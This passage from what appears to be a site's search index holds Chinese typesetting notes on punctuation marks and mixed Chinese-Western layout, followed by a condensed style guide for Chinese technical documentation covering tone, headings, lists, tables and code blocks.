<li>\u6807\u793a\u67d0\u4e9b\u76f8\u5173\u8054\u6210\u5206\u4e4b\u95f4\u7684\u5206\u754c</li> <li>U+00B7 MIDDLE DOT\uff08\u00b7\uff09</li> <li>\u5728\u53f0\u6e7e\u5360\u4e00\u4e2a\u5b57\u5bbd\uff0c\u5728\u5927\u9646\u5360\u534a\u4e2a\u5b57\u5bbd</li> <li>\u4e0d\u63a8\u8350\u4f7f\u7528 U+FF0E FULLWIDTH FULL STOP\uff08\uff0e\uff09\u3001U+2027 HYPHENATION POINT\uff08\u2027\uff09\u3001U+2022 BULLET\uff08\u2022\uff09\u3001U+30FB KATAKANA MIDDLE DOT\uff08\u30fb\uff09</li> </ul> </li> <li>\u4e66\u540d\u53f7<ul> <li>\u7528\u4e8e\u6807\u793a\u4e66\u540d\u3001\u7bc7\u540d\u3001\u6b4c\u66f2\u540d\u3001\u5f71\u5267\u540d\u3001\u6587\u4ef6\u540d\u3001\u5b57\u753b\u540d\u7b49\u5404\u79cd\u4f5c\u54c1\u540d\u79f0</li> <li>\u53f0\u6e7e<ul> <li>\u7532\u5f0f\uff1a\u6ce2\u6d6a\u5e95\u7ebf U+FE4F WAVY LOW LINE\uff08\ufe4f\uff09\uff0c\u76f8\u90bb\u4e66\u540d\u53f7\u95f4\u9700\u5206\u79bb\u5f00</li> <li>\u4e59\u5f0f\uff1a<ul> <li>U+300A LEFT DOUBLE ANGLE BRACKET\uff08\u300a\uff09\u4e0e U+300B RIGHT DOUBLE ANGLE BRACKET\uff08\u300b\uff09\u7528\u4e8e\u6807\u793a\u4e66\u540d</li> <li>U+3008 LEFT ANGLE BRACKET\uff08\u3008\uff09\u4e0e U+3009 RIGHT ANGLE BRACKET\uff08\u3009\uff09\u7528\u4e8e\u6807\u793a\u7bc7\u540d</li> </ul> </li> </ul> </li> <li>\u5927\u9646<ul> <li>\u65e0\u8bba\u4e66\u540d\u3001\u7bc7\u7ae0\u540d\u90fd\u4f7f\u7528\u53cc\u4e66\u540d\u53f7</li> <li>\u4e66\u540d\u53f7\u4e2d\u8fd8\u9700\u8981\u4e66\u540d\u53f7\u65f6\u91cc\u9762\u4e00\u5c42\u4f7f\u7528\u5355\u4e66\u540d\u53f7</li> </ul> </li> <li>\u4e59\u5f0f\u4e66\u540d\u53f7\u5c5e\u4e8e\u5939\u6ce8\u53f7</li> </ul> </li> <li>\u4e13\u540d\u53f7<ul> <li>\u6807\u793a\u4e13\u6709\u540d\u8bcd\u5e95\u7aef\u7684\u7b26\u53f7</li> <li>U+FF3F FULLWIDTH LOW LINE\uff08\uff3f\uff09</li> <li>\u540c\u7532\u5f0f\u4e66\u540d\u53f7\uff0c\u4e13\u540d\u53f7\u5df2\u751a\u5c11\u51fa\u73b0\u4e8e\u73b0\u4ee3\u4e66\u7c4d\uff0c\u4f46\u4ecd\u53ef\u89c1\u4e8e\u6559\u79d1\u4e66\u6216\u53e4\u7c4d\u7684\u6807\u793a</li> </ul> </li> <li>\u5206\u9694\u53f7<ul> <li>\u6807\u793a\u8bd7\u7684\u5206\u884c\u3001\u97f3\u8282\u8282\u62cd\u53ca\u76f8\u5173\u6587\u5b57\u7684\u5206\u9694</li> <li>U+002F SOLIDUS\uff08/\uff09\u3001U+FF0F FULLWIDTH SOLIDUS\uff08\uff0f\uff09</li> </ul> </li> </ul>"},{"location":"devops/typesetting/clreq/#_11","title":"\u4e2d\u897f\u6587\u6df7\u6392\u5904\u7406","text":"<ul> <li>\u5e94\u907f\u514d\u4f7f\u7528\u5168\u89d2 ASCII \u5b57\u7b26</li> <li>\u4e2d\u897f\u6df7\u6392\uff0c\u6b63\u6587\u662f\u4e2d\u6587\uff0c\u6240\u4ee5\u539f\u5219\u4e0a\u4f7f\u7528\u4e2d\u6587\u6807\u70b9\uff0c\u9075\u5b88\u4e2d\u6587\u6807\u70b9\u7684\u4e60\u60ef\u7528\u6cd5<ul> <li>\u516c\u5f0f\u8f83\u591a\u7684\u79d1\u5b66\u6280\u672f\u4e2d\u6587\u6392\u7248\u53ef\u4ee5\u7edf\u4e00\u4f7f\u7528\u897f\u6587\u53e5\u53f7 U+002E FULL STOP\uff08.\uff09\u3001\u897f\u6587\u7701\u7565\u53f7 U+2026 HORIZONTAL ELLIPSIS\uff08\u2026\uff09\uff0c\u5b57\u9762\u5206\u5e03\u6309\u897f\u6587\u4e60\u60ef</li> </ul> </li> <li>\u6a2a\u6392\u65f6\uff0c\u897f\u6587\u4f7f\u7528\u6bd4\u4f8b\u5b57\u4f53\uff0c\u963f\u62c9\u4f2f\u6570\u5b57\u5e38\u7528\u6bd4\u4f8b\u5b57\u4f53\u6216\u7b49\u5bbd\u5b57\u4f53</li> <li>\u539f\u5219\u4e0a\u6c49\u5b57\u4e0e\u897f\u6587\u5b57\u6bcd\u3001\u6570\u5b57\u4e4b\u95f4\u4f7f\u7528\u4e0d\u591a\u4e8e\u56db\u5206\u4e4b\u4e00\u6c49\u5b57\u5bbd\u7684\u5b57\u8ddd\u6216\u7a7a\u5305\u3002\u4f46\u897f\u6587\u51fa\u73b0\u5728\u884c\u9996\u884c\u5c3e\u65f6\u65e0\u987b\u52a0\u7a7a\u767d<ul> <li>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u897f\u6587\u8bcd\u95f4\u7a7a\u683c U+0020 SPACE\uff08 \uff09\uff0c\u5176\u5bbd\u5ea6\u968f\u4e0d\u540c\u5b57\u4f53\u4e5f\u6709\u53d8\u5316</li> </ul> </li> <li>\u897f\u6587\u5355\u5b57\u8bcd\u53ef\u4ee5\u4f7f\u7528\u8fde\u5b57\u7b26\u6765\u8de8\u884c\uff0c\u5176\u4f59\u60c5\u51b5\u4e0d\u5f97\u5206\u4e3a\u4e24\u884c<ul> <li>\u5fc5\u987b\u65ad\u884c\u65f6\u53ef\u4ee5\u4e0d\u9075\u7167\u897f\u6587\u4ece\u97f3\u8282\u65ad\u884c\u7684\u60ef\u4f8b\uff0c\u53ef\u4ee5\u5f3a\u5236\u65ad\u884c\u6765\u786e\u4fdd\u884c\u5c3e\u5bf9\u9f50</li> </ul> </li> <li>\u884c\u5185\u5305\u542b\u897f\u6587\u65f6\u591a\u4f7f\u7528\u5747\u6392\u6765\u5904\u7406<ul> <li>\u5404\u897f\u6587\u8bcd\u7ec4\u95f4\u3001\u963f\u62c9\u4f2f\u6570\u5b57\u4e4b\u95f4\u7684\u7a7a\u683c\u3001\u897f\u6587\u5b57\u6bcd\u4e0e\u963f\u62c9\u4f2f\u6570\u5b57\u4e4b\u95f4\u4e0d\u4f7f\u7528\u5747\u6392</li> <li>\u53ea\u8c03\u6574\u6c49\u5b57\u3001\u6c49\u5b57\u4e0e\u897f\u6587\u95f4\u7684\u5b57\u8ddd\u548c\u7a7a\u767d</li> </ul> </li> </ul>"},{"location":"devops/typesetting/tech/","title":"\u4e2d\u6587\u6280\u672f\u6587\u6863\u98ce\u683c\u6307\u5357","text":"<p> \u7ea6 3766 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>Abstract</p> <p>\u7531\u4e2d\u6587\u6280\u672f\u6587\u6863\u5199\u4f5c\u98ce\u683c\u6307\u5357\u7cbe\u7b80\u3001\u6574\u7406\u800c\u6765\uff0c\u4f9b\u53c2\u8003\u3002</p> <p>\u4e2a\u4eba\u611f\u89c9\u6bd4\u8f83\u91cd\u8981\u7684\u662f\u8bed\u8a00\u98ce\u683c\u3001\u4e2d\u897f\u6587\u6df7\u6392\u7684\u7a7a\u683c\u3001\u6807\u70b9\u7b26\u53f7\u8fd9\u4e9b\u90e8\u5206\u3002</p>"},{"location":"devops/typesetting/tech/#_2","title":"\u8bed\u8a00\u98ce\u683c","text":""},{"location":"devops/typesetting/tech/#_3","title":"\u5bf9\u8bdd\u5f0f","text":"<ul> <li>\u300c\u4f60\u53ef\u4ee5\u2026\u2026\u300d</li> <li>\u5e73\u6613\u8fd1\u4eba\u3001\u76f4\u622a\u4e86\u5f53</li> <li>\u907f\u514d\u8fc7\u4e8e\u53e3\u8bed\u5316\uff0c\u5197\u957f\u5570\u55e6\u3001\u7f3a\u4e4f\u903b\u8f91</li> </ul>"},{"location":"devops/typesetting/tech/#_4","title":"\u5ba2\u89c2\u793c\u8c8c","text":"<ul> <li>\u5bf9\u4e8e\u6307\u5bfc\u6027\u6587\u6863\uff0c\u4fdd\u6301\u51b7\u9759\u3001\u5ba2\u89c2\u3001\u7b80\u6d01\u7684\u8bed\u6c14</li> <li>\u907f\u514d\u4f7f\u7528\u62df\u4eba\u7684\u5199\u4f5c\u624b\u6cd5</li> <li>\u4e0d\u8981\u7a7f\u63d2\u592a\u591a\u73a9\u7b11</li> <li>\u4e0d\u8981\u4f7f\u7528\u53cd\u95ee\u53e5</li> <li>\u4e0d\u8981\u8f7b\u6613\u4f7f\u7528\u611f\u53f9\u53e5</li> <li>\u4e0d\u8981\u8f7b\u6613\u4f7f\u7528\u201c\u8bf7\u201d\u3001\u201c\u62b1\u6b49\u201d\uff0c\u9664\u975e\u771f\u7684\u5bf9\u8bfb\u8005\u9020\u6210\u4e86\u56f0\u6270</li> <li>\u907f\u514d\u8fc7\u5206\u4eb2\u5207\u7684\u79f0\u547c</li> </ul>"},{"location":"devops/typesetting/tech/#_5","title":"\u7b80\u6d01\u6e05\u6670","text":"<ul> <li>\u7981\u6b62\u5570\u55e6\u5197\u957f</li> <li>\u7981\u6b62\u903b\u8f91\u6df7\u4e71</li> <li>\u540c\u4e00\u6587\u6863\u4e2d\u52ff\u91cd\u590d\u8868\u8fbe\u540c\u4e00\u4e8b\u7269</li> <li>\u5c3d\u91cf\u7528\u4e3b\u52a8\u65f6\u6001\uff0c\u5c24\u5176\u8981\u9610\u8ff0\u6e05\u695a\u4e3b\u8bed\u548c\u5bbe\u8bed</li> </ul>"},{"location":"devops/typesetting/tech/#_6","title":"\u901a\u4fd7\u6613\u61c2","text":"<ul> <li>\u4e0d\u63a8\u8350\u4f7f\u7528\u884c\u8bdd\u9ed1\u8bdd\u3001\u4fda\u8bed\u3001\u810f\u8bdd\u7b49</li> <li>\u4e0d\u63a8\u8350\u4f7f\u7528\u7f51\u7edc\u6d41\u884c\u8bed</li> </ul>"},{"location":"devops/typesetting/tech/#_7","title":"\u7528\u6237\u5bfc\u5411","text":"<ul> <li>\u5145\u5206\u8003\u8651\u6587\u6863\u53d7\u4f17\u7684\u6280\u672f\u6c34\u5e73\u5206\u5e03\u4ee5\u53ca\u5b9e\u9645\u64cd\u4f5c\u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898</li> <li>\u5bf9\u4e8e\u64cd\u4f5c\u578b\u6280\u672f\u6587\u6863\uff0c\u9664\u8bed\u8a00\u5ba1\u6821\u5916\uff0c\u5efa\u8bae\u7ee7\u7eed\u8fdb\u884c\u201c\u6587\u6863\u53ef\u7528\u6027\u6d4b\u8bd5\u201d</li> <li>\u5bf9\u4e8e\u64cd\u4f5c\u578b\u6280\u672f\u6587\u6863\uff0c\u4e0d\u4ec5\u8981\u51c6\u786e\u63cf\u8ff0\u64cd\u4f5c\u6b65\u9aa4\uff0c\u8fd8\u5e94\u8bbe\u8eab\u5904\u5730\u8003\u8651\u7528\u6237\u53ef\u80fd\u9762\u4e34\u7684\u95ee\u9898\uff0c\u63d0\u4f9b\u8fdb\u4e00\u6b65\u7684\u8be6\u7ec6\u4fe1\u606f</li> </ul>"},{"location":"devops/typesetting/tech/#_8","title":"\u7528\u8bcd\u6070\u5f53","text":"<ul> <li>\u7528\u8bcd\u6b63\u786e\u53ca\u7528\u8bcd\u7edf\u4e00</li> <li>\u7981\u7528\u8bcd\u53c2\u8003\u300a\u65b0\u534e\u793e\u65b0\u95fb\u62a5\u9053\u4e2d\u7684\u7981\u7528\u8bcd\uff08\u7b2c\u4e00\u6279\uff09\u300b</li> <li>\u5e38\u7528\u8bcd<ul> <li>\u5fc5\u987b\u7528\u5bf9\u201c\u7684\u201d\u3001\u201c\u5730\u201d\u3001\u201c\u5f97\u201d\uff0c\u4e0d\u80fd\u4e71\u7528</li> <li>\u5fc5\u987b\u660e\u786e\u201c\u5176\u201d\u3001\u201c\u8be5\u201d\u3001\u201c\u6b64\u201d\u3001\u201c\u8fd9\u201d\u7b49\u4ee3\u8bcd\u6307\u4ee3\u7684\u5185\u5bb9\uff0c\u4fdd\u8bc1\u4e0d\u9020\u6210\u6b67\u4e49</li> <li>\u4e0d\u5efa\u8bae\u4f7f\u7528\u8868\u793a\u7a0b\u5ea6\u3001\u5f3a\u8c03\u8bed\u6c14\u7684\u8bcd</li> <li>\u4e0d\u5efa\u8bae\u4f7f\u7528\u51b7\u50fb\u3001\u751f\u9020\u6216\u8005\u6587\u8a00\u6587\u7684\u8bcd\u8bed</li> <li>\u7981\u6b62\u4f7f\u7528\u8fc7\u591a\u7684\u5f62\u5bb9\u8bcd\u4fee\u9970\u540d\u8bcd</li> </ul> </li> <li>\u7edf\u4e00\u7528\u8bcd<ul> <li>\u5fc5\u987b\u4fdd\u8bc1\u5168\u6587\u4eba\u79f0\u4ee3\u8bcd\u4e00\u81f4\uff0c\u4eba\u79f0\u4e0d\u80fd\u53cd\u590d\u6539\u53d8</li> <li>\u5efa\u8bae\u5c3d\u91cf\u4f7f\u7528\u4e3b\u52a8\u8bed\u6001\uff0c\u4e0d\u4f7f\u7528\u88ab\u52a8\u8bed\u6001</li> </ul> </li> </ul>"},{"location":"devops/typesetting/tech/#_9","title":"\u6587\u6863\u7ed3\u6784\u6837\u5f0f","text":""},{"location":"devops/typesetting/tech/#_10","title":"\u6807\u9898","text":"<ul> <li>\u4ece\u4e00\u7ea7\u5f00\u59cb\u9012\u589e\u4f7f\u7528\uff0c\u7981\u6b62\u8df3\u7ea7\u4f7f\u7528</li> <li>\u6700\u591a\u4e0d\u8d85\u8fc7\u56db\u7ea7</li> <li>\u4e00\u7ea7\u6807\u9898\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u4e14\u4e3a\u6587\u7ae0\u6807\u9898</li> <li>\u4e09\u7ea7\u6807\u9898\u4e0b\u6709\u5e76\u5217\u6027\u7684\u5185\u5bb9\u5efa\u8bae\u4f7f\u7528\u5217\u8868\u66ff\u4ee3</li> <li>\u6807\u9898\u6587\u672c<ul> <li>\u6982\u62ec\u53cd\u6620\u672c\u7ae0\u8282\u7684\u4e2d\u5fc3\u5185\u5bb9</li> <li>\u7b80\u6d01\u627c\u8981\u3001\u6db5\u4e49\u660e\u786e</li> <li>\u540c\u7ea7\u522b\u7684\u6807\u9898\u5c3d\u91cf\u4f7f\u7528\u76f8\u540c\u7684\u7ed3\u6784</li> <li>\u6807\u9898\u63cf\u8ff0\u64cd\u4f5c\u4efb\u52a1\u65f6\u5efa\u8bae\u4f7f\u7528\u201c\u52a8\u8bcd+\u4e3b\u9898\u8bcd\u201d\u7ed3\u6784\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528\u540d\u8bcd\u8bcd\u7ec4</li> </ul> </li> <li>\u6ce8\u610f\u4e8b\u9879<ul> <li>\u4e0b\u7ea7\u6807\u9898\u7981\u6b62\u91cd\u590d\u4e0a\u4e00\u7ea7\u6807\u9898\u7684\u5185\u5bb9</li> <li>\u4e0d\u5efa\u8bae\u6807\u9898\u4ee5\u6807\u70b9\u7b26\u53f7\u7ed3\u5c3e</li> <li>\u4e0d\u5efa\u8bae\u5728\u6807\u9898\u4e2d\u89e3\u91ca\u7f29\u7565\u8bed</li> <li>\u6807\u9898\u4e0e\u6807\u9898\u4e4b\u95f4\u5e94\u8be5\u6709\u5f15\u5bfc\u4ecb\u7ecd\u6027\u7684\u53e5\u5b50\u3002</li> <li>\u6807\u9898\u8981\u907f\u514d\u5b64\u7acb\u7f16\u53f7\uff08\u5373\u540c\u7ea7\u6807\u9898\u53ea\u6709\u4e00\u4e2a\uff09\uff0c\u6b63\u6587\u4e0d\u8981\u6709\u5b64\u7acb\u7684\u4e09\u7ea7\u6807\u9898\u548c\u56db\u7ea7\u6807\u9898</li> <li>\u9879\u76ee\u5217\u8868\u662f\u6700\u5c0f\u7f16\u53f7\u5355\u4f4d\uff0c\u9879\u76ee\u5217\u8868\u4e0b\u7981\u6b62\u5d4c\u5957\u4efb\u4f55\u7ea7\u522b\u7684\u6807\u9898</li> </ul> </li> </ul>"},{"location":"devops/typesetting/tech/#_11","title":"\u6bb5\u843d","text":"<ul> <li>\u4e00\u4e2a\u6bb5\u843d\u53ea\u80fd\u6709\u4e00\u4e2a\u4e3b\u9898\uff0c\u6216\u4e00\u4e2a\u4e2d\u5fc3\u53e5\u5b50</li> <li>\u6bb5\u843d\u7684\u4e2d\u5fc3\u53e5\u5b50\u5efa\u8bae\u653e\u5728\u6bb5\u9996\uff0c\u5bf9\u5168\u6bb5\u5185\u5bb9\u8fdb\u884c\u6982\u8ff0</li> <li>\u4e00\u4e2a\u6bb5\u843d\u7684\u957f\u5ea6\u5efa\u8bae\u5728 50\uff5e200 \u5b57\u4e4b\u95f4\uff0c\u5c3d\u91cf\u4e0d\u8981\u8d85\u8fc7 250 \u5b57</li> <li>\u6bb5\u843d\u4e4b\u95f4\u5efa\u8bae\u8bbe\u7f6e\u5408\u9002\u7684\u95f4\u8ddd\uff0c\u63d0\u9ad8\u53ef\u8bfb\u6027</li> <li>\u6280\u672f\u6587\u6863\u7684\u6bb5\u843d\u5f00\u5934\u4e0d\u5efa\u8bae\u7f29\u8fdb</li> <li>\u5bf9\u4e8e\u6280\u672f\u63cf\u8ff0\u7c7b\u4e3b\u9898\uff0c\u5e94\u8003\u8651\u5148\u56fe\u8868\uff0c\u540e\u53e5\u5b50\u7684\u539f\u5219</li> </ul>"},{"location":"devops/typesetting/tech/#_12","title":"\u53e5\u5b50","text":"<ul> <li>\u907f\u514d\u4f7f\u7528\u957f\u53e5\uff0c\u4e00\u4e2a\u53e5\u5b50\u5efa\u8bae\u4e0d\u8d85\u8fc7 100 \u5b57</li> <li>\u4f7f\u7528\u7b80\u5355\u53e5\u548c\u5e76\u5217\u53e5\uff0c\u907f\u514d\u4f7f\u7528\u590d\u5408\u53e5</li> <li>\u907f\u514d\u201d\u4e00\u9017\u5230\u5e95\u201d\u7684\u60c5\u51b5\uff0c\u5408\u7406\u65ad\u53e5</li> </ul>"},{"location":"devops/typesetting/tech/#_13","title":"\u6587\u6863\u5185\u5bb9\u5143\u7d20","text":""},{"location":"devops/typesetting/tech/#_14","title":"\u7a7a\u767d\u7b26\u53f7","text":""},{"location":"devops/typesetting/tech/#_15","title":"\u7a7a\u683c","text":"<ul> <li>\u7981\u6b62\u4f7f\u7528\u5168\u89d2\u7a7a\u683c\uff0c\u4e00\u5f8b\u4f7f\u7528\u534a\u89d2\u7a7a\u683c</li> <li>\u4e2d\u6587\u5b57\u7b26\uff08\u5305\u62ec\u6c49\u5b57\u548c\u4e2d\u6587\u6807\u70b9\u7b26\u53f7\uff09\u548c\u4e2d\u6587\u5b57\u7b26\u4e4b\u95f4\u7981\u6b62\u7a7a\u534a\u89d2\u7a7a\u683c</li> <li>\u82f1\u6587\u5b57\u7b26\u548c\u963f\u62c9\u4f2f\u6570\u5b57\u4e00\u822c\u4f7f\u7528\u534a\u89d2\u683c\u5f0f\uff0c\u6240\u4ee5\u5e94\u4f7f\u7528\u534a\u89d2\u7a7a\u683c\u5305\u56f4\uff0c\u4ee5\u4e0b\u60c5\u51b5\u4f8b\u5916<ul> <li>\u4f4d\u4e8e\u53e5\u9996\u65f6\uff0c\u5de6\u8fb9\u7a7a\u683c\u7701\u7565</li> <li>\u5176\u53f3\u4fa7\u4e3a\u534a\u89d2\u6807\u70b9\u6216\u5168\u89d2\u6807\u70b9\u65f6\uff0c\u53f3\u8fb9\u7a7a\u683c\u7701\u7565</li> </ul> </li> <li>\u9664\u8868\u793a\u7f29\u8fdb\u3001\u5217\u8868\u7ea7\u522b\u3001\u4ee3\u7801\u5757\u4e2d\u56fa\u6709\u7a7a\u683c\u3001markdown \u8868\u683c\u4e2d\u7684\u7a7a\u683c\u5916\uff0c\u7981\u6b62\u8fde\u7eed\u51fa\u73b0\u4e24\u4e2a\u53ca\u4ee5\u4e0a\u7684\u534a\u89d2\u7a7a\u683c</li> <li>\u4e0d\u5efa\u8bae\u4f7f\u7528 Tab\uff08\u5236\u8868\u7b26\uff09\u66ff\u6362\u7a7a\u683c</li> </ul>"},{"location":"devops/typesetting/tech/#_16","title":"\u7a7a\u884c","text":"<ul> <li>\u4e0d\u540c\u6bb5\u843d\u95f4\u5efa\u8bae\u4f7f\u7528\u4e00\u4e2a\u7a7a\u884c\u9694\u5f00</li> <li>\u4e0d\u540c\u6392\u7248\u683c\u5f0f\u4e4b\u95f4\u5efa\u8bae\u4f7f\u7528\u4e00\u4e2a\u7a7a\u884c\u9694\u5f00\uff0c\u5982\u6807\u9898\u4e0e\u7d27\u8ddf\u7740\u7684\u6b63\u6587\u4e4b\u95f4\uff0c\u6b63\u6587\u4e0e\u4ee3\u7801\u5757\u4e4b\u95f4\u3001\u6b63\u6587\u4e0e\u8868\u683c\u4e4b\u95f4\u7b49</li> <li>\u7981\u6b62\u8fde\u7eed\u51fa\u73b0\u4e24\u4e2a\u53ca\u4ee5\u4e0a\u7684\u7a7a\u884c</li> </ul>"},{"location":"devops/typesetting/tech/#_17","title":"\u5217\u8868","text":"<ul> <li>\u5f53\u5217\u8868\u9879\u4e4b\u95f4\u7684\u987a\u5e8f\u4e0d\u91cd\u8981\u65f6\uff0c\u4f7f\u7528\u65e0\u5e8f\u5217\u8868\uff1b\u5f53\u5404\u9879\u4e4b\u95f4\u7684\u987a\u5e8f\u5f88\u91cd\u8981\u65f6\uff0c\u4f7f\u7528\u6709\u5e8f\u5217\u8868</li> <li>\u5e76\u5217\u5217\u8868\u9879\u4e2d\u5efa\u8bae\u4f7f\u7528\u76f8\u4f3c\u7684\u53e5\u5b50\u7ed3\u6784</li> <li>\u6bcf\u4e00\u9879\u7684\u957f\u5ea6\u8981\u5c3d\u91cf\u63a5\u8fd1</li> <li>\u907f\u514d\u5728\u6bcf\u4e00\u9879\u5f00\u5934\u91cd\u590d\u76f8\u540c\u7684\u8bcd\u8bed</li> <li>\u4f7f\u7528\u6e05\u6670\u7684\u3001\u63cf\u8ff0\u6027\u7684\u53e5\u5b50\u6216\u77ed\u8bed\u6765\u5f15\u51fa\u5217\u8868</li> <li>\u5e76\u5217\u5217\u8868\u9879\u4e2d\u4fdd\u6301\u6807\u70b9\u7b26\u53f7\u4e00\u81f4<ul> <li>\u82e5\u5217\u8868\u9879\u662f\u53e5\u5b50\uff0c\u90a3\u4e48\u6bcf\u4e00\u9879\u5efa\u8bae\u4ee5\u53e5\u53f7\u7ed3\u5c3e</li> <li>\u82e5\u5217\u8868\u9879\u662f\u8bcd\u7ec4\uff0c\u5219\u4e0d\u5efa\u8bae\u4ee5\u4efb\u4f55\u6807\u70b9\u7ed3\u5c3e</li> <li>\u82e5\u5217\u8868\u9879\u65e2\u6709\u8bcd\u7ec4\u53c8\u6709\u53e5\u5b50\uff0c\u5219\u5efa\u8bae\u7edf\u4e00\u4ee5\u53e5\u53f7\u7ed3\u5c3e</li> </ul> </li> <li>\u907f\u514d\u5d4c\u5957\u4f7f\u7528\u5217\u8868\uff0c\u8fd9\u6837\u901a\u5e38\u4f1a\u663e\u5f97\u5197\u957f\u590d\u6742<ul> <li>\u5982\u679c\u4e00\u5b9a\u8981\u8868\u73b0\u591a\u5c42\u7ea7\u7684\u5217\u8868\uff0c\u5efa\u8bae\u6700\u591a\u4e0d\u8d85\u8fc7 3 \u7ea7\uff0c\u4e14\u6bcf\u4e00\u7ea7\u90fd\u8981\u7528\u4e0d\u540c\u6837\u5f0f\u7684\u5c0f\u5706\u70b9</li> </ul> </li> <li>\u4e00\u4e2a\u64cd\u4f5c\u4efb\u52a1\u7684\u6b65\u9aa4\u63cf\u8ff0\u901a\u5e38\u8981\u4f7f\u7528\u6709\u5e8f\u5217\u8868<ul> <li>\u4e3a\u65b9\u4fbf\u7528\u6237\u8bb0\u5fc6\uff0c\u5efa\u8bae\u4e25\u683c\u9650\u5236\u5217\u8868\u9879\u5728 7 \u4e2a\u4ee5\u4e0b\uff0c\u6700\u591a\u4e0d\u8981\u8d85\u8fc7 9 \u4e2a\u6b65\u9aa4</li> </ul> </li> </ul>"},{"location":"devops/typesetting/tech/#_18","title":"\u8868\u683c","text":"<ul> <li>\u6240\u6709\u5185\u5bb9\u90fd\u5efa\u8bae\u4fdd\u6301\u5de6\u5bf9\u9f50</li> <li>\u6240\u6709\u8868\u683c\u90fd\u9700\u8981\u6709\u8868\u5934\u63cf\u8ff0\uff0c\u5373\u8868\u683c\u7b2c\u4e00\u884c\u4e2d\u63cf\u8ff0\u5404\u5217\u5185\u5bb9\u7684\u77ed\u8bed</li> <li>\u4fdd\u8bc1\u8868\u683c\u540c\u4e00\u884c\u7684\u5355\u5143\u683c\u4e0d\u8de8\u9875</li> <li>\u6bcf\u4e2a\u8868\u683c\u4e0b\u90fd\u8981\u7a7a\u4e00\u884c\uff0c\u4e14\u8fd9\u4e00\u7a7a\u884c\u7684\u6837\u5f0f\u4e3a\u6b63\u6587</li> <li>\u540c\u4e00\u6280\u672f\u6587\u6863\u6216\u4ea7\u54c1\u624b\u518c\u4e2d\u76f8\u540c\u7c7b\u578b\u8868\u683c\u7684\u8868\u5934\u63cf\u8ff0\u9700\u8981\u4fdd\u6301\u4e00\u81f4</li> <li>\u8868\u683c\u4e2d\u7684\u5185\u5bb9\u5e94\u8be5\u5c3d\u91cf\u7b80\u7ec3\uff0c\u6587\u5b57\u8868\u8ff0\u98ce\u683c\u4fdd\u6301\u4e00\u81f4</li> <li>\u4e0d\u51fa\u73b0\u7a7a\u767d\u7684\u5355\u5143\u683c\uff0c\u5efa\u8bae\u65e0\u5185\u5bb9\u5355\u5143\u683c\u586b\u5199\u201c\u65e0\u201d\u6216\u7279\u5b9a\u542b\u4e49\u7b26\u53f7\uff08\u5982\u201c/\u201d\uff09</li> <li>\u5982\u679c\u591a\u4e2a\u5355\u5143\u683c\u4e2d\u7684\u5185\u5bb9\u76f8\u540c\uff0c\u5efa\u8bae\u5c06\u5185\u5bb9\u590d\u5236\u6216\u8005\u91c7\u7528\u591a\u4e2a\u5355\u5143\u683c\u5408\u5e76\u7684\u65b9\u5f0f\uff0c\u4e0d\u8981\u4f7f\u7528\u201c\u540c\u4e0a\u201d</li> </ul>"},{"location":"devops/typesetting/tech/#_19","title":"\u56fe\u5f62\u56fe\u7247","text":"<ul> <li>\u4e2d\u6587\u6587\u6863\u91cc\u56fe\u5f62\u56fe\u7247\u4e0a\u7684\u6587\u5b57\u5efa\u8bae\u90fd\u7528\u4e2d\u6587\uff0c\u5982\u679c\u539f\u56fe\u6587\u5b57\u662f\u5176\u4ed6\u8bed\u8a00\uff0c\u5e94\u8be5\u5148\u505a\u597d\u56fe\u7247\u672c\u5730\u5316\u5de5\u4f5c</li> <li>\u540c\u4e00\u6587\u6863\u5185\u56fe\u5f62\u56fe\u7247\u4e0a\u7684\u6587\u5b57\u5e94\u8be5\u7edf\u4e00\u5b57\u4f53</li> <li>\u56fe\u5f62\u56fe\u7247\u4e2d\u907f\u514d\u51fa\u73b0\u5927\u6bb5\u6587\u5b57\uff0c\u63cf\u8ff0\u6027\u8bed\u8a00\u5efa\u8bae\u653e\u5230\u56fe\u5916</li> <li>\u56fe\u5f62\u56fe\u7247\u4e2d\u5305\u542b\u7f29\u7565\u8bed\u65f6\uff0c\u9700\u8981\u5728\u56fe\u8bf4\u660e\u4e2d\u5bf9\u7f29\u7565\u8bed\u8fdb\u884c\u89e3\u91ca</li> <li>\u56fe\u8bf4\u660e\u548c\u56fe\u5c3d\u91cf\u4fdd\u8bc1\u5728\u540c\u4e00\u9875\u4e2d\u663e\u793a</li> <li>\u56fe\u7247\u7684\u547d\u540d\u5efa\u8bae\u4f7f\u7528\u63cf\u8ff0\u6027\u7684\u6587\u5b57</li> <li>\u63d2\u5165\u56fe\u7247\u65f6\u5efa\u8bae\u6dfb\u52a0\u66ff\u4ee3\u6587\u672c\uff0c\u4ece\u800c\u6539\u8fdb\u6587\u6863\u7684\u65e0\u969c\u788d\u8bbf\u95ee</li> </ul>"},{"location":"devops/typesetting/tech/#_20","title":"\u4ee3\u7801\u5757","text":"<ul> <li>\u4ee3\u7801\u5757\u524d\u540e\u5fc5\u987b\u52a0\u4e0a\u4e00\u884c\u7a7a\u884c</li> <li>\u4ee3\u7801\u5757\u8981\u6ce8\u610f\u7f29\u8fdb</li> <li>\u5982\u679c\u524d\u7aef\u652f\u6301\uff0c\u5efa\u8bae\u9ad8\u4eae\u4ee3\u7801\u5757\uff0c\u65b9\u4fbf\u9605\u8bfb</li> <li>\u5982\u679c\u524d\u7aef\u652f\u6301\uff0c\u5efa\u8bae\u4e3a\u4ee3\u7801\u5757\u52a0\u4e0a\u53ef\u4f9b\u7528\u6237\u76f4\u63a5\u590d\u5236\u4ee3\u7801\u7684\u6309\u94ae\uff0c\u63d0\u9ad8\u6587\u6863\u6613\u7528\u6027</li> <li>\u4e00\u884c\u6ce8\u91ca\u4e0d\u80fd\u592a\u957f\uff0c\u592a\u957f\u65f6\u5e94\u9002\u5f53\u8fdb\u884c\u65ad\u53e5\u5e76\u5207\u5206\u5230\u4e0b\u4e00\u884c</li> <li>\u5fc5\u987b\u6839\u636e\u4ee3\u7801\u5757\u4e2d\u5b9a\u4e49\u7684\u8bed\u6cd5\u9009\u62e9\u76f8\u5e94\u7684\u6ce8\u91ca\u7b26\uff0c\u4e0d\u80fd\u81ea\u521b\u6ce8\u91ca\u7b26</li> 